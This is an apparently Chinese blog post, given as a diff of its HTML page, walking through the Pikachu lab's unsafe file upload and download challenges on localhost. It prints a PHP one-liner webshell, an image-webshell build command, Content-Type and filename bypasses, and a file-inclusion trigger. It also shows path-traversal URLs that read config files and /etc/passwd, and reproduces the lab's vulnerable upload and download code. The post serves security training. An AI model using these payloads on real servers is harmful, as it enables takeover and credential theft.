@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pikachu靶场通关：文件上传与下载 | Qu0rtz-blip 的博客</title><meta name="author" content="Qu0rtz-blip"><meta name="copyright" content="Qu0rtz-blip"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="皮卡丘（Pikachu）不安全文件上传与下载通关记录 实验环境：Windows 10 + Pikachu + Burp Suite + 蚁剑靶场地址：http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 Unsafe File Upload 与 Unsafe File Download 两个模块的通关过程。这两个漏洞是一对镜像：上传是”让服务器执行我给的文件”，下载是”把服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场通关：文件上传与下载">
+<meta property="og:url" content="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-Upload-Download/index.html">
+<meta property="og:site_name" content="Qu0rtz-blip 的博客">
+<meta property="og:description" content="皮卡丘（Pikachu）不安全文件上传与下载通关记录 实验环境：Windows 10 + Pikachu + Burp Suite + 蚁剑靶场地址：http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 Unsafe File Upload 与 Unsafe File Download 两个模块的通关过程。这两个漏洞是一对镜像：上传是”让服务器执行我给的文件”，下载是”把服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qu0rtz-blip.github.io/img/cover-4.jpg">
+<meta property="article:published_time" content="2026-11-26T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-26T11:44:49.165Z">
+<meta property="article:author" content="Qu0rtz-blip">
+<meta property="article:tag" content="Pikachu靶场">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="文件下载">
+<meta property="article:tag" content="一句话木马">
+<meta property="article:tag" content="蚁剑">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qu0rtz-blip.github.io/img/cover-4.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pikachu靶场通关：文件上传与下载",
+  "url": "https://qu0rtz-blip.github.io/2026/11/26/Pikachu-Upload-Download/",
+  "image": "https://qu0rtz-blip.github.io/img/cover-4.jpg",
+  "datePublished": "2026-11-26T04:00:00.000Z",
+  "dateModified": "2026-11-26T11:44:49.165Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Qu0rtz-blip",
+      "url": "https://qu0rtz-blip.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-Upload-Download/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pikachu靶场通关：文件上传与下载',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-site.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">60</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover-4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Qu0rtz-blip 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Pikachu靶场通关：文件上传与下载</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pikachu靶场通关：文件上传与下载</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-26T11:44:49.165Z" title="更新于 2026-11-26 19:44:49">2026-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="皮卡丘（Pikachu）不安全文件上传与下载通关记录"><a href="#皮卡丘（Pikachu）不安全文件上传与下载通关记录" class="headerlink" title="皮卡丘（Pikachu）不安全文件上传与下载通关记录"></a>皮卡丘（Pikachu）不安全文件上传与下载通关记录</h1><blockquote>
+<p><strong>实验环境</strong>：Windows 10 + Pikachu + Burp Suite + 蚁剑<br><strong>靶场地址</strong>：<code>http://127.0.0.1/pikachu/</code></p>
+</blockquote>
+<blockquote>
+<p>本次记录皮卡丘靶场 Unsafe File Upload 与 Unsafe File Download 两个模块的通关过程。<br>这两个漏洞是一对镜像：上传是”让服务器执行我给的文件”，下载是”把服务器的文件拿回来看”，<br>入口形状几乎一样——<strong>一个来自前端的文件名</strong>。放在一起打，对根因的理解会清楚很多。</p>
+</blockquote>
+<hr>
+<h2 id="一、不安全文件上传与下载"><a href="#一、不安全文件上传与下载" class="headerlink" title="一、不安全文件上传与下载"></a>一、不安全文件上传与下载</h2><h3 id="1-1-两个功能，一个根因"><a href="#1-1-两个功能，一个根因" class="headerlink" title="1.1 两个功能，一个根因"></a>1.1 两个功能，一个根因</h3><p>上传和下载在 Web 系统里无处不在：头像、附件、报表导出、资源下载。它们的实现流程是镜像的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件上传                                文件下载</span><br><span class="line">前端选文件 multipart 提交               页面放下载链接</span><br><span class="line">   ↓                                      ↓</span><br><span class="line">后台校验（类型/后缀/大小）              后台把文件名拼进路径</span><br><span class="line">   ↓                                      ↓</span><br><span class="line">move_uploaded_file 存盘                 fopen + echo 字节流回浏览器</span><br></pre></td></tr></table></figure>
+
+<p>两边的安全设计也指向同一件事：<strong>文件名&#x2F;路径不能由前端决定</strong>。皮卡丘把这两条线各拆成一关组，后台代码里”来自前端的文件名直接拼进路径”的写法原封不动地摆在那儿，区别只在利用方式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                文件上传                          文件下载</span><br><span class="line">攻击者控制       文件名 + 文件内容                 文件名（路径）</span><br><span class="line">目的            让服务器执行恶意脚本（RCE）        读取服务器文件（信息泄露）</span><br><span class="line">PHP 场景        一句话木马 + 蚁剑                 配置文件、源码、密码文件</span><br><span class="line">后续            直接拿到交互式 shell              拿到配置后往往能接出更大的洞</span><br></pre></td></tr></table></figure>
+
+<p>一句话：<strong>上传送进去的是代码，下载带出来的是内容</strong>。它们也常常配合——下载读到数据库配置、源码，往往就是下一轮上传&#x2F;包含利用的钥匙。</p>
+<h3 id="1-2-关卡入口"><a href="#1-2-关卡入口" class="headerlink" title="1.2 关卡入口"></a>1.2 关卡入口</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafeupload/upload.php          ← 上传·概述页</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafeupload/clientcheck.php     ← 上传·客户端 check</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafeupload/servercheck.php     ← 上传·服务端 check</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafeupload/getimagesize.php    ← 上传·getimagesize 校验</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/unsafedownload.php ← 下载·概述页</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php  ← 下载·处理页</span><br></pre></td></tr></table></figure>
+
+<p>上传模块三关页面长得一样：一个”这里只允许上传图片o！”的文件选择框；下载模块是”NBA 1996年 黄金一代”球员头像列表，提示”点击球员名字即可下载头像图片”。</p>
+<p>上传模块的三关是同一条防线被一层层加固的过程：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前端 JS 校验后缀    →    服务端校验 MIME    →    服务端校验后缀+内容+重命名</span><br><span class="line"> (clientcheck)           (servercheck)           (getimagesize)</span><br><span class="line">    ↓                       ↓                        ↓</span><br><span class="line"> 随便绕                  随便绕                   标准答案示范</span><br></pre></td></tr></table></figure>
+
+<p>记住一个总原则：<strong>前端做的任何校验都只是提示，不是防护</strong>——请求离开浏览器之后，攻击者想让它是什么样就是什么样。</p>
+<hr>
+<h2 id="二、通关记录"><a href="#二、通关记录" class="headerlink" title="二、通关记录"></a>二、通关记录</h2><h3 id="2-1-上传·客户端-check"><a href="#2-1-上传·客户端-check" class="headerlink" title="2.1 上传·客户端 check"></a>2.1 上传·客户端 check</h3><p>先随便上传一个正常图片，返回文件上传目录。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/upload_start.png"></p>
+<p>再选一个 <code>shell.php</code>（内容<code>&lt;?php @eval($_POST(&#39;cmd&#39;); ?&gt;</code>），浏览器立刻弹窗”上传的文件不符合要求”。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/upload_error.png"></p>
+<p>弹窗是页面里一段 JS 弹的，说明文件校验在前端，只在我们<strong>选择文件的那一刻</strong>起作用，服务器端根本没这个检查。</p>
+<p>这里尝试将原来的<code>shell.php</code>文件后缀名改为<code>png</code>或<code>jpg</code>再次上传，发现成功上传，说明前端校验较弱，只检测文件后缀名，不检测文件内容。</p>
+<p>于是换打法：将一句话木马 php 文件改为图片 <code>shell.png</code> 让前端放行，用 Burp 拦下 POST 包，把表单里的<code>filename</code>改为<code>shell.php</code>后放行</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/upload_php.png"></p>
+<p>页面直接回显上传成功。</p>
+<p>接下来，尝试用蚁剑连接</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/antsword_success.png"></p>
+<p>连接成功，文件管理器里已经能看到服务器的目录树。</p>
+<h3 id="2-2-上传·服务端-check（MIME-校验）"><a href="#2-2-上传·服务端-check（MIME-校验）" class="headerlink" title="2.2 上传·服务端 check（MIME 校验）"></a>2.2 上传·服务端 check（MIME 校验）</h3><p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/MIME_start.png"></p>
+<p>这次尝试把上一关伪造的png图片上传，发现仍然上传成功了，说明后端的MIME校验只检查了客户端提交的<code>Content-Type</code>请求体，没有读取文件内容</p>
+<p>因此，这关可以直接上传php文件，只是burp抓包拦截后只把 <code>Content-Type</code> 改成 <code>image/jpeg</code>即可：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/MIME_bp.png"></p>
+<p>上传成功，蚁剑照连</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/MIME_success.png"></p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/MIME_dir.png"></p>
+<p>通关。</p>
+<p>这关和上一关的区别值得记一下：<strong>校验从”前端”挪到”服务端”并不会自动变安全——校验的字段本身可以被伪造，那它就不是校验</strong>。</p>
+<h3 id="2-3-上传·getimagesize-校验"><a href="#2-3-上传·getimagesize-校验" class="headerlink" title="2.3 上传·getimagesize 校验"></a>2.3 上传·getimagesize 校验</h3><p>这里还是尝试将前两关那个伪造的<code>shell.png</code>文件上传，发现上传失败。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/getimagesize_error.png"></p>
+<p>尝试在<code>shell.png</code>文件里加入<code>GIF89a</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>(<span class="string">&#x27;cmd&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>改完后，重新上传</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/getimagesize_upload_success.png"></p>
+<p>成功上传，说明后端虽然校验了图片内容，但只校验了图片头，实际内容并没有校验。</p>
+<p>且根据返回的路径，发现后端应该是对文件名进行了随机重命名的，防护相对前两关更加严格。</p>
+<blockquote>
+<p>补充：如果后端校验比较严格，可以尝试制作图片马绕过校验。如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy /b normal.jpg + shell.txt shell.jpg      ← Windows</span><br><span class="line">cat normal.jpg shell.txt &gt; shell.jpg          ← Linux</span><br></pre></td></tr></table></figure>
+
+<p>即用画图&#x2F;命令行生成一张真图片，在图片数据末尾追加一句话木马即可。</p>
+</blockquote>
+<p>但这里有一个问题，现在它只是一个<code>.phg</code>，访问不会被当作PHP执行，因此，我尝试通过burp抓包将文件后缀名改为了<code>.php</code>和<code>phtml</code>：</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/getimagesize_error2.png"></p>
+<p>发现上传失败，提示必须是<code>jpg,jpeg,png</code>中的一个，大概猜出后端做的是白名单校验，那么就不能通过上传<code>.htaccess</code>来让<code>Apache</code>把我们上传的图片当作 PHP 代码执行。</p>
+<p>单独看 <code>getimagesize.php</code>，这一关防住了直接上传 webshell。</p>
+<p>但 Pikachu 还有<strong>文件包含</strong>，可以通过文件包含来引爆。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/11/24/5779106b0552e5d8d30033778836.png&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>包含执行后，图片里的 PHP 代码就活了，再用蚁剑连接即可。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/getimagesize_success.png"></p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/getantsword.png"></p>
+<blockquote>
+<p>这一关想独立 getshell 还有一条路是配合解析漏洞（如 Apache 按后缀识别的旧解析规则 <code>shell.php.abc</code>、IIS 的分号截断），但皮卡丘的随机重命名把可控后缀也消掉了。<strong>严格的校验挡住的不只是绕过，还有组合的可能</strong>。</p>
+</blockquote>
+<h3 id="2-4-下载·先正常下载一次"><a href="#2-4-下载·先正常下载一次" class="headerlink" title="2.4 下载·先正常下载一次"></a>2.4 下载·先正常下载一次</h3><p>下载关只有一道题。点「科比.布莱恩特」，浏览器弹出一个 <code>kb.png</code> 的下载。抓包看一下请求 URL：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure>
+
+
+<p><code>filename</code> 参数就是文件名——和上传关”filename 直接进路径”是同一种入口形状，只是方向反了过来。</p>
+<h3 id="2-5-下载·路径穿越，把源码下载下来"><a href="#2-5-下载·路径穿越，把源码下载下来" class="headerlink" title="2.5 下载·路径穿越，把源码下载下来"></a>2.5 下载·路径穿越，把源码下载下来</h3><p>这里我们尝试下载一下源码，但直接请求<code>?filename=execdownload.php</code>会返回 404 Not Found，需要向上跳一级，输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/download_sourcecode.png"></p>
+<p>源码中有一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_path</span>=<span class="string">&quot;download/<span class="subst">&#123;$_GET[&#x27;filename&#x27;]&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>从这里可以看到图片在 <code>download/</code> 目录里，而后台直接拿 <code>filename</code> 拼路径，因此需要用 <code>../</code> 跳出这个目录。</p>
+<p>再读一下配置文件，皮卡丘的数据库配置放在 <code>vul/../inc/config.inc.php</code>，相对于 <code>download/</code> 目录就是 <code>../../../inc/config.inc.php</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php</span><br></pre></td></tr></table></figure>
+
+<p>浏览器下载了一个 <code>config.inc.php</code>，用文本编辑器打开——<strong>数据库地址、账号、密码全在里面</strong>（皮卡丘默认 <code>root</code>、密码为空）。</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/config.inc.png"></p>
+<p>输入<code>?filename=../../../.git/config</code>，拿Git配置文件；</p>
+<p>输入<code>?filename=../../../../../etc/passwd</code>，拿系统用户信息；</p>
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-Upload-Download/command.png"></p>
+<p>下载的是<strong>源文件本身</strong>而不是执行结果，这正是下载漏洞和文件包含在利用上的分水岭。</p>
+<h3 id="2-6-下载·失败长什么样"><a href="#2-6-下载·失败长什么样" class="headerlink" title="2.6 下载·失败长什么样"></a>2.6 下载·失败长什么样</h3><p>传一个不存在的文件名，页面直接跳回提示”你要下载的文件不存在，请重新下载”。这说明后台有 <code>file_exists()</code> 检查——<strong>payload 必须指向真实存在的文件</strong>，但换个角度，它也把”猜路径”变成了<strong>有反馈的试错</strong>：存在就下载、不存在就提示，等于一个免费的文件存在性探测接口。</p>
+<hr>
+<h2 id="三、源码分析：漏洞是怎么写出来的"><a href="#三、源码分析：漏洞是怎么写出来的" class="headerlink" title="三、源码分析：漏洞是怎么写出来的"></a>三、源码分析：漏洞是怎么写出来的</h2><p>上传三关共用 <code>inc/uploadfunction.php</code>，里面的三个函数就是三道防线的三个版本；下载关是独立的 <code>execdownload.php</code>。四个入口，同一个病根。</p>
+<h3 id="3-1-上传·客户端-check——校验写在了浏览器里"><a href="#3-1-上传·客户端-check——校验写在了浏览器里" class="headerlink" title="3.1 上传·客户端 check——校验写在了浏览器里"></a>3.1 上传·客户端 check——校验写在了浏览器里</h3><p><code>clientcheck.php</code> 的”校验”是一段前端 JS：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileExt</span>(<span class="params">filename</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">var</span> flag = <span class="literal">false</span>; <span class="comment">//状态</span></span><br><span class="line">       <span class="keyword">var</span> arr = [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>];</span><br><span class="line">       <span class="comment">//取出上传文件的扩展名</span></span><br><span class="line">       <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">       <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span><br><span class="line">       <span class="comment">//比较</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>(ext == arr[i])</span><br><span class="line">           &#123;</span><br><span class="line">               flag = <span class="literal">true</span>; <span class="comment">//一旦找到合适的，立即退出循环</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//条件判断</span></span><br><span class="line">       <span class="keyword">if</span>(!flag)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="title function_">alert</span>(<span class="string">&quot;上传的文件不符合要求，请重新选择！&quot;</span>);</span><br><span class="line">           location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>绑在文件选择框的 <code>onchange</code> 上。而后台调用的 <code>upload_client()</code> 里<strong>没有任何后缀检查</strong>，直接 <code>move_uploaded_file</code> 存盘：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$save_path</span>=<span class="title function_ invoke__">rtrim</span>(<span class="variable">$save_path</span>,<span class="string">&#x27;/&#x27;</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$save_path</span>.<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>问题在于：JS 跑在浏览器里，Burp 改包的瞬间它已经出局了。另外两点也值得记：<strong>原样使用用户上传的文件名</strong>（可以覆盖同名文件、可以带特殊字符），上传成功后还把完整路径 <code>&#123;$upload[&#39;new_path&#39;]&#125;</code> 直接打印在页面上——源码作者自己都注释了一句”输出了路径，暴露了”。</p>
+<h3 id="3-2-上传·服务端-check——校验了可以伪造的字段"><a href="#3-2-上传·服务端-check——校验了可以伪造的字段" class="headerlink" title="3.2 上传·服务端 check——校验了可以伪造的字段"></a>3.2 上传·服务端 check——校验了可以伪造的字段</h3><p><code>servercheck.php</code> 调用 <code>upload_sick()</code>，服务端确实做了一次检查：</p>
